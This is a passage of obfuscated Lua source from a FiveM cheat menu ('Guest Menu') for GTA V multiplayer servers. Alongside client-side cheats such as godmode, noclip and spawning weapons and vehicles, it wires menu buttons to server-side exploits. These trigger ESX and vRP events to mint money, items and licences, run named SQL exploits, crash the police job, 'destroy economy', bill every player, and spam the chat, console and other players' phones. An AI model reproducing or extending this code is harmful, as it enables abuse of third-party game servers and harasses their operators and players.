                                Guestcustomnotif(
                                    "~p~Guest Menu : ~s~Key " .. aM .. " is not valid!",
                                    0
                                )
                            end
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponOptionsTypes") then
                for fO, g6 in pairs(I.FunctionTables.weaponsTable) do
                    if I.menuButton(fO, "weaponOptionsTypeSelection") then
                        eK = g6
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponOptionsTypeSelection") then
                for cd, g6 in pairs(eK) do
                    if I.menuButton(g6.name, "weaponsModOptions") then
                        eL = g6
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponsModOptions") then
                if I.button("Get weapon") then
                    I.natives.d6900ec9e918eb1426be32868e2b0(GetPlayerPed(-1), GetHashKey(eL.id), 1000, false)
                elseif I.button("Get ammo") then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(eL.id), 250)
                elseif I.checkBox("~Y~Infinite ammo", eL.bInfAmmo) then
                    eL.bInfAmmo = not eL.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), eL.bInfAmmo, GetHashKey(eL.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                    PedSkipNextReloading(GetPlayerPed(-1))
                end
                for fO, g6 in pairs(eL.mods) do
                    if I.menuButton(fO, "weaponsModSelect") then
                        eM = g6
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponsModSelect") then
                for cd, gd in pairs(eM) do
                    if I.button(gd.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(eL.id), GetHashKey(gd.id))
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("doorsoptions") then
                if I.button("Open doors", "~g~[Safe]") then
                    SetVehicleDoorOpen(GetPlayersLastVehicle(), door, false, false)
                elseif I.button("Close doors", "~g~[Safe]") then
                    SetVehicleDoorShut(GetPlayersLastVehicle(), door, false)
                elseif I.button("Broke doors", "~g~[Safe]") then
                    SetVehicleDoorBroken(GetPlayersLastVehicle(), door, false)
                elseif I.button("Unlock cars", "~g~[Safe]") then
                    local X = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
                    if X then
                        if DoesEntityExist(X) then
                            SetVehicleDoorsLocked(X, 1)
                            SetVehicleDoorsLockedForPlayer(X, PlayerId(), false)
                            SetVehicleDoorsLockedForAllPlayers(X, false)
                        end
                    end
                elseif I.button("Lock cars", "~g~[Safe]") then
                    local X = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
                    if X then
                        if DoesEntityExist(X) then
                            SetVehicleDoorsLocked(X, 1)
                            SetVehicleDoorsLockedForPlayer(X, PlayerId(), true)
                            SetVehicleDoorsLockedForAllPlayers(X, true)
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("savedVehiclesOptions") then
                I.SubSettingTitle(
                    "savedVehiclesOptions",
                    #I.Guestdata.savedVehicles .. " saved cars"
                )
                if I.button("Save the current vehicle", "Input") then
                    if IsPedInAnyVehicle(I.Guestdata.pLocalPlayer.pedId) then
                        local ge = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("name", "", 100)
                        if I.functions.game.isNullOrEmpty(ge) then
                            ge = "un-named"
                        end
                        local gf = {
                            name = ge,
                            props = I.functions.game.getVehicleProperties(
                                I.Guestdata.pLocalPlayer.cVehicle
                            )
                        }
                        if gf and gf.props then
                            d.Main.GuestTable.GuestInsert(
                                I.Guestdata.savedVehicles,
                                gf
                            )
                        end
                    end
                end
                if
                    I.Guestdata.savedVehicles and
                        #I.Guestdata.savedVehicles > 0
                 then
                    for gg = 1, #I.Guestdata.savedVehicles do
                        if
                            I.menuButton(
                                I.Guestdata.savedVehicles[gg].name ..
                                    " | " .. I.Guestdata.savedVehicles[gg].props.model,
                                "selectedSavedVehicleOptions"
                            )
                         then
                            I.Guestdata.savedVehiclesOptionsHandle =
                                I.Guestdata.savedVehicles[gg]
                            I.Guestdata.savedVehiclesOptionsDeleteHandle = gg
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selectedSavedVehicleOptions") then
                if I.button("Spawn a car", "~g~[Safe]") then
                    local gh = I.Guestdata.savedVehiclesOptionsHandle
                    if gh.props then
                        I.functions.b8bb6a6560cb3ac96edc69c960db7560(
                            {hash = gh.props.model, props = gh.props, setIn = true}
                        )
                    end
                elseif I.button("Delete", "~g~[Safe]") then
                    d.Main.GuestTable.GuestRemove(
                        I.Guestdata.savedVehicles,
                        I.Guestdata.savedVehiclesOptionsDeleteHandle
                    )
                    I.openMenu("savedVehiclesOptions")
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleLosSantosCustoms") then
                if I.menuButton("Cosmetics", "vehicleLosSantosCustomsCosmetics", ">") then
                elseif I.menuButton("Performances", "vehicleLosSantosCustomsPerformance", ">") then
                elseif I.button("Change plate", "~g~[Safe]") then
                    local gi =
                        I.NewFunction.c9f328ef7b30553a6705e827855bd30c(
                        "Enter Plate Text (8 Characters):",
                        "Guest",
                        8
                    )
                    if not I.functions.game.isNullOrEmpty(gi) then
                        I.NewFunction.fhdfsqodjfgsh(I.Guestdata.pLocalPlayer.cVehicle)
                        SetVehicleNumberPlateText(I.Guestdata.pLocalPlayer.cVehicle, gi)
                    end
                elseif I.button("Max upgrade", "~g~[Safe]") then
                    I.functions.f9c87ad6955fa7d2353023a55e5742a5(
                        GetVehiclePedIsIn(I.Guestdata.pLocalPlayer.pedId)
                    )
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleLosSantosCustomsPerformance") then
                if IsPedInAnyVehicle(I.Guestdata.pLocalPlayer.pedId, 0) then
                    I.functions.initializeUpgradesTab()
                    if IsToggleModOn(I.Guestdata.pLocalPlayer.cVehicle, 18) then
                        turboStatus = "~g~Installed"
                    else
                        turboStatus = "~r~Not Installed"
                    end
                    if I.button("Turbo", turboStatus) then
                        if not IsToggleModOn(I.Guestdata.pLocalPlayer.cVehicle, 18) then
                            ToggleVehicleMod(
                                I.Guestdata.pLocalPlayer.cVehicle,
                                18,
                                not IsToggleModOn(I.Guestdata.pLocalPlayer.cVehicle, 18)
                            )
                        else
                            ToggleVehicleMod(
                                I.Guestdata.pLocalPlayer.cVehicle,
                                18,
                                not IsToggleModOn(I.Guestdata.pLocalPlayer.cVehicle, 18)
                            )
                        end
                    end
                else
                    if I.button("You're not inside a vehicle") then
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("autopilot") then
                if I.button("Auto drive on waypoint", "~g~[Safe]") then
                    autodriving = true
                    local gj = GetFirstBlipInfoId(8)
                    if DoesBlipExist(gj) then
                        coords = GetBlipInfoIdCoord(gj)
                        TaskVehicleDriveToCoordLongrange(
                            PlayerPedId(),
                            GetVehiclePedIsUsing(PlayerPedId()),
                            coords.x,
                            coords.y,
                            coords.z,
                            I.OptionConfig.CruiseSpeed,
                            I.OptionConfig.DrivingStyle,
                            10.0
                        )
                        d.Main.GuestThread(
                            function()
                                while not killmenu and autodriving do
                                    Wait(1000)
                                    plycoords = GetEntityCoords(PlayerPedId())
                                    distance =
                                        GetDistanceBetweenCoords(
                                        coords.x,
                                        coords.y,
                                        coords.z,
                                        plycoords.x,
                                        plycoords.y,
                                        coords.z,
                                        false
                                    )
                                    if distance < 10.0 then
                                        ClearPedTasks(PlayerPedId())
                                        Guestcustomnotif(
                                            "~p~Guest Menu : ~s~Finished!",
                                            false
                                        )
                                        SetDriveTaskCruiseSpeed(PlayerPedId(), 0)
                                        autodriving = false
                                    end
                                end
                            end
                        )
                    end
                    if I.OptionConfig.SelCruiseSpeedIndex == 1 then
                        I.OptionConfig.DrivingStyle = 6
                    elseif I.OptionConfig.SelCruiseSpeedIndex == 2 then
                        I.OptionConfig.DrivingStyle = 5
                    elseif I.OptionConfig.SelCruiseSpeedIndex == 3 then
                        I.OptionConfig.DrivingStyle = 1074528293
                    elseif I.OptionConfig.SelCruiseSpeedIndex == 4 then
                        I.OptionConfig.DrivingStyle = 786603
                    elseif I.OptionConfig.SelCruiseSpeedIndex == 5 then
                        I.OptionConfig.DrivingStyle = 2883621
                    elseif I.OptionConfig.SelCruiseSpeedIndex == 6 then
                        I.OptionConfig.DrivingStyle = 786468
                    end
                elseif I.button("Stop autodriving", "~g~[Safe]") then
                    autodriving = false
                    ClearPedTasks(PlayerPedId())
                    Guestcustomnotif("~p~Guest Menu : ~s~Finished!", false)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleLosSantosCustomsCosmetics") then
                if I.menuButton("Simple colors changer", "simplecolors", ">") then
                elseif I.button("~p~                                               COLOR OPTIONS") then
                elseif I.button("Change the color", "~g~[Work on imports]") then
                    local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                    local r = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Red / 0-255", "", 100)
                    local g = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Green / 0-255", "", 100)
                    local b = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Blue / 0-255", "", 100)
                    r = d.Main.GuestToNum(r)
                    g = d.Main.GuestToNum(g)
                    b = d.Main.GuestToNum(b)
                    if r == nil then
                        r = 0
                    end
                    if g == nil then
                        g = 0
                    end
                    if b == nil then
                        b = 0
                    end
                    if r > 255 then
                        r = 255
                    end
                    if r < 0 then
                        r = 0
                    end
                    if g > 255 then
                        g = 255
                    end
                    if g < 0 then
                        g = 0
                    end
                    if b > 255 then
                        b = 255
                    end
                    if b < 0 then
                        b = 0
                    end
                    SetVehicleCustomPrimaryColour(playerVeh, r, g, b)
                    SetVehicleCustomSecondaryColour(playerVeh, r, g, b)
                elseif I.checkBox("~Y~Multicolors", I.OptionConfig.vehRainbowCol) then
                    local gk, gl = nil
                    if I.OptionConfig.vehRainbowCol then
                        ClearVehicleCustomPrimaryColour(I.Guestdata.pLocalPlayer.cVehicle)
                        ClearVehicleCustomSecondaryColour(I.Guestdata.pLocalPlayer.cVehicle)
                        SetVehicleColours(I.Guestdata.pLocalPlayer.cVehicle, gk, gl)
                    else
                        gk, gl = GetVehicleColours(I.Guestdata.pLocalPlayer.cVehicle)
                    end
                    I.OptionConfig.vehRainbowCol = not I.OptionConfig.vehRainbowCol
                elseif I.button("~p~                                               LIGHT OPTIONS") then
                elseif I.checkBox("~Y~Multicolors lights", I.OptionConfig.vehRainbowLights) then
                    I.OptionConfig.vehRainbowLights = not I.OptionConfig.vehRainbowLights
                elseif I.button("Xenon lights", "~g~[Might not work on imports]") then
                    ToggleVehicleMod(veh, 22, true)
                elseif I.button("~p~                                               WHEELS OPTIONS") then
                elseif I.button("Improve the wheels", "~g~[Might not work on imports]") then
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                elseif I.button("Change the rims", "~g~[Might not work on imports]") then
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                elseif I.button("~p~                                               OTHER OPTIONS") then
                elseif I.button("Put on tinted windows", "~g~[Work on imports]") then
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("simplecolors") then
                if I.menuButton("Primary color", "vehiclecolors", ">") then
                elseif I.menuButton("Secondary color", "vehiclecolors2", ">") then
                elseif I.button("~o~This is in beta so it might dont work!") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehiclecolors") then
                if I.button("Change the color > ~r~Red") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 0, 0)
                    SetVehicleCustomSecondaryColour(playerVeh, 255, 0, 0)
                elseif I.button("Change the color > ~b~Blue") then
                    SetVehicleCustomPrimaryColour(playerVeh, 0, 0, 255)
                    SetVehicleCustomSecondaryColour(playerVeh, 0, 0, 255)
                elseif I.button("Change the color > ~g~Green") then
                    SetVehicleCustomPrimaryColour(playerVeh, 0, 255, 0)
                    SetVehicleCustomSecondaryColour(playerVeh, 0, 255, 0)
                elseif I.button("Change the color > ~p~Purple") then
                    SetVehicleCustomPrimaryColour(playerVeh, 97, 73, 255)
                    SetVehicleCustomSecondaryColour(playerVeh, 97, 73, 255)
                elseif I.button("Change the color > ~o~Orange") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 102, 0)
                    SetVehicleCustomSecondaryColour(playerVeh, 255, 102, 0)
                elseif I.button("Change the color > ~y~Yellow") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 221, 119)
                    SetVehicleCustomSecondaryColour(playerVeh, 255, 221, 119)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehiclecolors2") then
                if I.button("Change the color > ~r~Red") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 0, 0)
                    SetVehicleCustomPrimaryColour(playerVeh, 0, 0, 255)
                elseif I.button("Change the color > ~b~Blue") then
                    SetVehicleCustomPrimaryColour(playerVeh, 0, 0, 255)
                    SetVehicleCustomSecondaryColour(playerVeh, 0, 0, 255)
                elseif I.button("Change the color > ~g~Green") then
                    SetVehicleCustomPrimaryColour(playerVeh, 0, 255, 0)
                    SetVehicleCustomSecondaryColour(playerVeh, 0, 255, 0)
                elseif I.button("Change the color > ~p~Purple") then
                    SetVehicleCustomPrimaryColour(playerVeh, 97, 73, 255)
                    SetVehicleCustomSecondaryColour(playerVeh, 97, 73, 255)
                elseif I.button("Change the color > ~o~Orange") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 102, 0)
                    SetVehicleCustomSecondaryColour(playerVeh, 255, 102, 0)
                elseif I.button("Change the color > ~y~Yellow") then
                    SetVehicleCustomPrimaryColour(playerVeh, 255, 221, 119)
                    SetVehicleCustomSecondaryColour(playerVeh, 255, 221, 119)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleSpawnSelected") then
                for fO, g6 in ipairs(I.FunctionTables.fullVehiclesList[selectedCarTypeIdx]) do
                    local gm = GetLabelText(g6)
                    if gm == "NULL" then
                        gm = g6
                    end
                    if I.menuButton(gm, "vehicleSpawnSelectedOptions") then
                        selectedCarToSpawn = fO
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleSpawnSelectedOptions") then
                if I.button("Spawn Car") then
                    I.functions.fb0c2bc4ba54c60cd98ee1a728ab45e(
                        I.FunctionTables.fullVehiclesList[selectedCarTypeIdx][selectedCarToSpawn]
                    )
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsTriggerEvents") then
                if I.menuButton("ESX Triggers", "serverOptionsTriggerEventsESX", ">") then
                elseif I.menuButton("vRP Triggers", "serverOptionsTriggerEventsVRP", ">") then
                elseif I.button("Spam Chat", "Server") then
                    local c9 =
                        I.NewFunction.c9f328ef7b30553a6705e827855bd30c(
                        "Enter message",
                        "Guest | cow2000",
                        60
                    )
                    I.functions.dfcac7e80c6b7bc3e666d2811c72508(c9)
                elseif I.button("de619a5e3f0bbd797ca20da9e02cba3 Earrape", "Server") then
                    I.functions.exploits.de619a5e3f0bbd797ca20da9e02cba3()
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsTriggerEventsESX") then
                if I.menuButton("Money & Item Options", "serverOptionsTriggerEventsESXMoney", ">") then
                elseif I.button("Skin Changer", "Client") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_skin") then
                        I.ba324546()
                        I.exploitthing(
                            false,
                            false,
                            "esx_skin:openRestrictedMenu",
                            function(data, menu)
                            end
                        )
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Unrestrain Handcuffs", "Client") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_policejob") then
                        I.exploitthing(false, false, "esx_policejob:unrestrain")
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Full Hunger", "Client") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_status") then
                        I.exploitthing(false, false, "esx_status:set", "hunger", 1000000)
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Full Thirst", "Client") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_status") then
                        I.exploitthing(false, false, "esx_status:set", "thirst", 1000000)
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Tuner Chip", "Client") then
                    if
                        I.functions.f1d4856a114a6894f5812bb126a541b("tunerchip") or
                            I.functions.f1d4856a114a6894f5812bb126a541b("tunerlaptop") or
                            I.functions.f1d4856a114a6894f5812bb126a541b("xgc-tuner") or
                            I.functions.f1d4856a114a6894f5812bb126a541b("tuninglaptop")
                     then
                        I.exploitthing(false, false, "xgc-tuner:openTuner")
                        I.exploitthing(false, false, "tuning:useLaptop")
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Open Jail Menu ~(!)", "Client") then
                    if
                        I.functions.f1d4856a114a6894f5812bb126a541b("esx-qalle-jail") or
                            I.functions.f1d4856a114a6894f5812bb126a541b("esx_qalle_jail")
                     then
                        I.exploitthing(false, false, "esx-qalle-jail:openJailMenu")
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                    end
                elseif I.button("Spawn Owned Vehicle", "Server") then
                    local eR = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Spawn Name", "", 20)
                    local eS = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Plate Number", "", 8)
                    I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c(eR, PlayerId(), eS)
                elseif I.button("Sell Owned Vehicle", "Server") then
                    I.functions.sPO.ecff77c7cd1a99d5394e7bd0b878bccb()
                elseif I.button("Finish Community Service", "Server") then
                    I.exploitthing(
                        false,
                        true,
                        "esx_a0c3c7c65448d332b391432b870632:finisha0c3c7c65448d332b391432b870632",
                        -1
                    )
                elseif I.button("Get All Licenses", "Server") then
                    I.functions.exploits.esx_givelicenses()
                elseif I.button("GCPhone Earrape", "Server") then
                    I.functions.exploits.a60d1e2bb110c550359e9f9425dc7baf()
                elseif I.button("Licenses SQL Exploit", "Server") then
                    I.functions.exploits.esx_license()
                elseif I.button("Police Alert Spam", "Server") then
                    I.functions.exploits.esx_outlawalert()
                elseif I.button("Bill Everyone", "Server") then
                    I.functions.exploits.esx_billing()
                elseif I.button("Phone J~s~obs Spam", "Server") then
                    I.functions.exploits.phoneSpam()
                elseif I.button("Spam Server Console", "Server") then
                    I.functions.exploits.esx_spam_server_console()
                elseif I.button("Police Job Crash Attempt ~r~(!)", "Server") then
                    I.functions.exploits.esx_policejob_crash()
                elseif
                    I.comboBox(
                        "Open Boss Menu ~r~(!)",
                        eb,
                        ec,
                        ed,
                        function(dI, dJ)
                            ec = dI
                            ed = dI
                        end
                    )
                 then
                    I.exploitthing(
                        false,
                        false,
                        "esx_society:openBossMenu",
                        d.Main.GuestString.GuestLower(
                            eb[ed]
                        ),
                        function(data, menu)
                            menu.close()
                        end
                    )
                    I.ba324546()
                elseif
                    I.comboBox(
                        "Kashacters SQL Exploit",
                        I.menuTables.serverKashactersSQL.words,
                        I.menuTables.serverKashactersSQL.current,
                        I.menuTables.serverKashactersSQL.selected,
                        function(dI, dJ)
                            I.menuTables.serverKashactersSQL.current = dI
                            I.menuTables.serverKashactersSQL.selected = dI
                            I.menuTables.serverKashactersSQL.actual =
                                I.menuTables.serverKashactersSQL.lists[I.menuTables.serverKashactersSQL.selected]
                        end
                    )
                 then
                    I.functions.exploits.esx_kashacters(false, "clean", I.menuTables.serverKashactersSQL.actual)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsTriggerEventsESXMoney") then
                if
                    I.comboBox(
                        "Harvest Items ~r~(!)",
                        {"Weed", "Opium", "Meth", "Coke", "Gaz Bottle", "Fix Tool", "Caro Tool"},
                        e7,
                        e8,
                        function(dI, dJ)
                            e7 = dI
                            e8 = dI
                        end
                    )
                 then
                    I.functions.exploits.esx_harvestitems()
                elseif
                    I.comboBox(
                        "Generate Job Paycheck ~r~(!)",
                        I.menuTables.exploitableJobsTable.Money,
                        e3,
                        e4,
                        function(dI, dJ)
                            e3 = dI
                            e4 = dI
                        end
                    )
                 then
                    local gn =
                        I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter the amount of money for paycheck", "", 10)
                    if not I.functions.game.isNullOrEmpty(gn) then
                        I.exploitthing(
                            false,
                            true,
                            I.menuTables.exploitableJobsTable.Money.Value[e4] .. ":pay",
                            d.Main.GuestToNum(gn)
                        )
                    end
                elseif
                    I.comboBox(
                        "Spawn J~s~obs Items ~r~(!)",
                        I.menuTables.exploitableJobsTable.Item,
                        e5,
                        e6,
                        function(dI, dJ)
                            e5 = dI
                            e6 = dI
                        end
                    )
                 then
                    I.functions.exploits.esx_jobitems()
                elseif
                    I.comboBox(
                        "Spawn Custom Items ~r~(!)",
                        I.menuTables.customExploitableItems.Item,
                        e9,
                        ea,
                        function(dI, dJ)
                            e9 = dI
                            ea = dI
                        end
                    )
                 then
                    I.functions.exploits.esx_spawncustomitems()
                elseif I.button("Spawn A Custom Item ~r~(!)", "Server") then
                    I.functions.exploits.esx_spawncustomitem()
                elseif I.button("Stop Harvesting ~r~(!)", "Server") then
                    I.functions.exploits.esx_harvest_stop()
                elseif I.button("Wash Dirty Money ~r~(!)", "Server") then
                    I.functions.exploits.esx_moneywash()
                elseif I.button("Moneymaker ~r~(!)", "Server") then
                    I.functions.exploits.esx_moneymaker()
                elseif I.button("Destory Economy ~r~(!)", "Server") then
                    I.functions.exploits.run_esx_moneymaker(1337539100, 25)
                    I.functions.exploits.esx_give_something("item_money", "money", 10000000)
                    for fO = 0, #I.natives.GetActivePlayers() do
                        I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c(
                            "blista",
                            fO,
                            I.NewFunction.a1fa3be3614abf8c650e659bab68d0f2(3) ..
                                " " .. I.NewFunction.a47fd66c141b06eb90c77c8cfb1dd3cb(4)
                        )
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsTriggerEventsVRP") then
                if I.button("Toggle Handcuffs", "Client") then
                    b5.toggleHandcuff()
                elseif I.button("Clear Wanted Level", "Client") then
                    b5.applyWantedLevel(0)
                elseif I.button("Trucker Job Money", "Client") then
                    local gn = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter $ Amount:", "", 12)
                    if not I.functions.game.isNullOrEmpty(gn) then
                        local distance = gn / 3.80
                        vRPtruckS = aX.a53984adb4d443ef1db5da1683ae5a("vRP_trucker", "vRP_trucker")
                        vRPtruckS.finishTruckingDelivery({distance})
                    end
                elseif I.button("Casino Chips", "Client") then
                    local ao = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Chips Amount:", "", 12)
                    if not I.functions.game.isNullOrEmpty(ao) then
                        vRPcasinoS = aX.a53984adb4d443ef1db5da1683ae5a("vRP_casino", "vRP_casino")
                        vRPcasinoS.payRouletteWinnings({ao, 2})
                    end
                elseif I.button("Chests Money", "Server") then
                    I.exploitthing(true, true, "basic")
                    I.exploitthing(true, true, "silver")
                    I.exploitthing(true, true, "legendary")
                elseif I.button("Custom vehicle", "Server") then
                    local fl = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of money", "", 12)
                    if not I.functions.game.isNullOrEmpty(fl) then
                        I.exploitthing(false, true, "lscustoms:payGarage", {costs = -fl})
                    end
                elseif I.button("Get license", "Server") then
                    I.exploitthing(false, true, "dmv:success")
                elseif I.button("Bank Deposit", "Server") then
                    local fl = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of money", "", 12)
                    if not I.functions.game.isNullOrEmpty(fl) then
                        I.exploitthing(false, true, "Banca:deposit", fl)
                        I.exploitthing(false, true, "bank:deposit", fl)
                    end
                elseif I.button("Bank Withdraw", "Server") then
                    local fl = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of money", "", 12)
                    if not I.functions.game.isNullOrEmpty(fl) then
                        I.exploitthing(false, true, "bank:withdraw", fl)
                        I.exploitthing(false, true, "Banca:withdraw", fl)
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            end
            local go = I.Guestdata.pLocalPlayer.cVehicle
            if go then
                SetVehicleModKit(go, 0)
                for b7, eN in pairs(I.menuTables.vehiclePerformanceTable) do
                    if I.isMenuOpened("vehicleLosSantosCustomsPerformance" .. eN.name) then
                        local gp = eN.id
                        local gq = eN.name .. " Level "
                        local gr = GetNumVehicleMods(go, gp) - 1
                        for b7 = 0, gr, 1 do
                            if I.button(gq .. b7, "~g~[Safe]") then
                                SetVehicleMod(go, gp, b7)
                            end
                        end
                        I.d81c77ca5806c108e0dad172ac845()
                    end
                end
            end
            if #I.GuestNotif > 0 then
                for gs = 1, #I.GuestNotif do
                    local gt = I.GuestNotif[gs]
                    if gt then
                        gt["opacity"] = (gt["opacity"] or gt["time"] / 1000 * 60) - 1
                        local fW = 0.005 + gs * .05
                        local gu = (GetGameTimer() - gt["startTime"]) / gt["time"] * 100
                        I.draw_3D(1, 0.8 * fW, gt["text"], gt["opacity"])
                        if gu >= 100 then
                            I.removeNotification2(gs)
                        end
                    end
                end
            end
            SetPlayerInvincible(PlayerId(), I.OptionConfig.godmode)
            SetEntityInvincible(I.Guestdata.pLocalPlayer.pedId, I.OptionConfig.godmode)
            SetEntityProofs(
                I.Guestdata.pLocalPlayer.pedId,
                I.OptionConfig.godmode,
                I.OptionConfig.godmode,
                I.OptionConfig.godmode,
                I.OptionConfig.godmode,
                I.OptionConfig.godmode
            )
            SetPedCanRagdoll(I.Guestdata.pLocalPlayer.pedId, not I.OptionConfig.noRagdoll)
            if I.OptionConfig.semiGodmode then
                if GetEntityHealth(I.Guestdata.pLocalPlayer.pedId) < 200 then
                    I.natives.adc12da2eac5ceb7b3e53abdbb48(
                        I.Guestdata.pLocalPlayer.pedId,
                        200
                    )
                end
            end
            if I.OptionConfig.neverWanted then
                ClearPlayerWantedLevel(PlayerId())
            end
            if I.OptionConfig.invisible then
                I.OptionConfig.bInvisible = true
                I.natives.a5a42faa7cf2d2e6ec9530df349f5a7(
                    I.Guestdata.pLocalPlayer.pedId,
                    0,
                    0
                )
            end
            if not I.OptionConfig.invisible and I.OptionConfig.bInvisible then
                I.OptionConfig.bInvisible = false
                I.natives.a5a42faa7cf2d2e6ec9530df349f5a7(
                    I.Guestdata.pLocalPlayer.pedId,
                    1,
                    1
                )
            end
            if I.OptionConfig.infStamina then
                ResetPlayerStamina(PlayerId())
            end
            if I.OptionConfig.noClip then
                I.functions.a45f51ed515827ac9468de1f98359cb()
            end
            if I.OptionConfig.superJump then
                SetSuperJumpThisFrame(PlayerId())
            end
            if I.OptionConfig.tinyPlayer then
                I.OptionConfig.bTinyPlayer = true
                SetPedConfigFlag(I.Guestdata.pLocalPlayer.pedId, 223, true)
            elseif not I.OptionConfig.tinyPlayer and I.OptionConfig.bTinyPlayer then
                I.OptionConfig.bTinyPlayer = false
                SetPedConfigFlag(I.Guestdata.pLocalPlayer.pedId, 223, false)
            end
            SetSeethrough(I.OptionConfig.heatVision)
            SetNightvision(I.OptionConfig.nightVision)
            if I.OptionConfig.flashmanSP then
                I.functions.doForceFieldTick(5)
                SetSuperJumpThisFrame(PlayerId())
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                SetPedMoveRateOverride(PlayerId(), 10.0)
                RequestNamedPtfxAsset("core")
                UseParticleFxAssetNextCall("core")
                StartNetworkedParticleFxNonLoopedOnEntity(
                    "ent_sht_electrical_box",
                    I.Guestdata.pLocalPlayer.pedId,
                    0.0,
                    0.0,
                    -0.5,
                    0.0,
                    0.0,
                    0.0,
                    1.0,
                    false,
                    false,
                    false
                )
            end
            if I.OptionConfig.sPOFlingPlayer then
                local coords = GetEntityCoords(GetPlayerPed(I.OptionConfig.sPOFlingedPlayer))
                I.natives.d5cb04ddaa81e3685adb07e123e0631(coords.x, coords.y, coords.z, 4, 0.0, 0, 1, 0.0, 1)
            end
            if I.OptionConfig.aPOFreeze then
                I.functions.aPO.dc00b052bd600c772db135459d3ef24()
            end
            if I.OptionConfig.aPOFlyingCars then
                I.functions.aPO.f2ae7507d6c4ad587226368a01bd45d7()
            end
            if I.OptionConfig.aPODisableDrivingCars then
                I.functions.aPO.eca565c68b6d24bb61676c7e7452e71()
            end
            if I.OptionConfig.aPONoisyVehs then
                I.functions.aPO.dea77e5d7afb36d18381bcb13c16eb7()
            end
            if e0 == 2 then
                ShowHudComponentThisFrame(14)
            elseif e0 == 3 then
                I.functions.e564abecb856e0385c2ecb46e4c6a2b8("+", 0.5, 0.5, 0.15, 0.1, I.mainColor)
            end
            if I.OptionConfig.visDrawFPS then
                local gv = 1.0 / GetFrameTime()
                I.functions.e564abecb856e0385c2ecb46e4c6a2b8("[Guest Menu]")
            end
            I.natives.setArtificialLightsState(I.OptionConfig.visBlackout)
            if I.OptionConfig.visForceRadar then
                DisplayRadar(true)
            end
            if eB < 1 then
                SetVehicleDensityMultiplierThisFrame(eB)
                SetRandomVehicleDensityMultiplierThisFrame(eB)
                SetParkedVehicleDensityMultiplierThisFrame(eB)
                SetAmbientVehicleRangeMultiplierThisFrame(1.0)
